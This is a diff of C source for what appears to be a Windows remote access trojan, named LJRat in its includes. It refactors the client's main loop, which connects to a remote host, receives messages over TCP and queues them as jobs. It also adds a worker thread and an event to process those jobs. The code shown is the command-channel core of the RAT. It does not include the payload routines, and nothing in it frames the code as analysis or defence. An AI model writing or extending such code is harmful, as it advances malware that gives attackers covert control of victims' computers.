@@ -2,16 +2,16 @@
 
 #include <winsock2.h>
 #include <Windows.h>
+#include <process.h>
 #include "error.h"
 #include "LJRat.h"
 #include "session.h"
 #include "debug.h"
 #include "message.h"
 #include "list.h"
+#include "worker.h"
 
-int gShutdown;
-SRW_LIST_HEAD job_list;
-SRW_LIST_HEAD send_list;
+SESSION_CTX session_ctx;
 
 #ifndef BUILD_DLL
 
@@ -70,14 +70,25 @@ EXPORT_FUNC ERROR_T Run(VOID)
     TIMEVAL timeout = {0};
     PMESSAGE pMsg = NULL;
     PLIST_ITEM pTemp = NULL;
+    HANDLE hThread = INVALID_HANDLE_VALUE;
+    DWORD dwThreadId;
 
-    gShutdown = 0;
-    SRWListInitialize(&job_list);
-    SRWListInitialize(&send_list);
+    session_ctx.gShutdown = 0;
+    SRWListInitialize(&session_ctx.job_list);
+    SRWListInitialize(&session_ctx.send_list);
+    session_ctx.hJobWait = CreateEventA(NULL, FALSE, FALSE, NULL);
+
+    hThread = (HANDLE) _beginthreadex(NULL, 0, WorkerThread, NULL, 0, &dwThreadId);
+    if (0 == hThread)
+    {
+        iError = E_THREAD_ERROR;
+        goto end;
+    }
 
     iStartup = WSAStartup(MAKEWORD(2,2), &wData);
     if (E_SUCCESS != iStartup)
     {
+        iError =  E_WINSOCK_ERROR;
         goto end;
     }
 
@@ -104,35 +115,37 @@ EXPORT_FUNC ERROR_T Run(VOID)
     {
         goto end;
     }
-
     iError = SessionInit(&session, AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (E_SUCCESS != iError) {
         goto end;
     }
-
     iError = SessionConnect(&session, &addr);
 
     // Set Select timeout to 1 second so we can check for shutdown condition.
     timeout.tv_sec = 1;
 
-    while (SHUTDOWN_INITIATED != gShutdown)
+    while (SHUTDOWN_INITIATED != session_ctx.gShutdown)
         {
             FD_ZERO(&read_fds);
             FD_SET(session.sock, &read_fds);
             iError = select(0, &read_fds, NULL, NULL, &timeout);
 
-            switch (iSelectRet) {
+            switch (iError) {
                 case 0:
                     DBG_PRINT("Timeout\n");
-                    continue;
+                    break;
                 case 1:
                     iError = MessageReceive(session.sock, &pMsg);
                     if (ERROR_SUCCESS != iError) {
-                        continue;
+                        DBG_PRINT("Error reading msg\n");
+                        break;
                     }
+
                     pTemp = ListItemCreate((PVOID) pMsg);
-                    SRWListAddTail(&job_list, &pTemp->link);
-                    continue;
+                    SRWListAddTail(&session_ctx.job_list, &pTemp->link);
+                    SetEvent(session_ctx.hJobWait);
+                    
+                    break;
                 default:
                     DBG_PRINT("Error %d\n", WSAGetLastError());
                     ;
